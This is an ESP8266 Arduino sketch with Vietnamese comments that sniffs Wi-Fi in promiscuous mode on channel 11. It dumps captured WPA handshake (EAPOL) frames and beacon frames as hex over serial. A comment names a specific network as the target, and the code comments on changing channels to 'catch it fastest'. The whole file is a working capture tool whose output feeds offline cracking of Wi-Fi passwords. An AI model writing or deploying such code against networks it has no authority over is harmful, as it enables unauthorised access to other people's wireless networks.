#include <ESP8266WiFi.h>

extern "C" {
#include "user_interface.h"
}

// Cấu trúc lọc gói tin
void sniffer_callback(uint8_t *buf, uint16_t len) {
  // Gói tin WiFi bắt đầu từ byte thứ 12 trong buffer của ESP8266
  // buf[12] là Frame Control field
  
  uint8_t frame_type = (buf[12] & 0x0C) >> 2;
  uint8_t frame_subtype = (buf[12] & 0xF0) >> 4;

  bool is_eapol = false;
  
  // 1. Tìm gói EAPOL (Handshake) - Loại Data (0x02) hoặc QoS Data (0x08)
  // Và kiểm tra EtherType 0x888E (802.1X Authentication)
  if (frame_type == 2 || frame_subtype == 8) {
    for (int i = 0; i < len - 1; i++) {
      if (buf[i] == 0x88 && buf[i+1] == 0x8E) {
        is_eapol = true;
        break;
      }
    }
  }

  // 2. Tìm gói Beacon (0x08 - Management Frame) để lấy ESSID
  bool is_beacon = (frame_type == 0 && frame_subtype == 8);

  // Chỉ in ra nếu là Handshake hoặc Beacon của mục tiêu
  if (is_eapol || is_beacon) {
    Serial.print("PKT: ");
    for (int i = 0; i < len; i++) {
      if (buf[i] < 0x10) Serial.print("0");
      Serial.print(buf[i], HEX);
    }
    Serial.println();
  }
}

void setup() {
  Serial.begin(115200);
  WiFi.disconnect();
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(sniffer_callback);
  wifi_promiscuous_enable(1);
  
  // Ép chip chạy ở Channel 11 (hoặc channel của mạng Hoang Phat)
  // Bạn có thể sửa số 11 thành channel bạn muốn để bắt nhanh nhất
  wifi_set_channel(11); 
  
  Serial.println("\n[SYSTEM] SNIFFER CUC MANH KICH HOAT - CHANNEL 11");
}

void loop() {
  // Nếu muốn bắt mọi mạng xung quanh, bỏ comment dòng dưới để nhảy kênh
  /*
  for (int i = 1; i <= 13; i++) {
    wifi_set_channel(i);
    delay(500); 
  }
  */
}
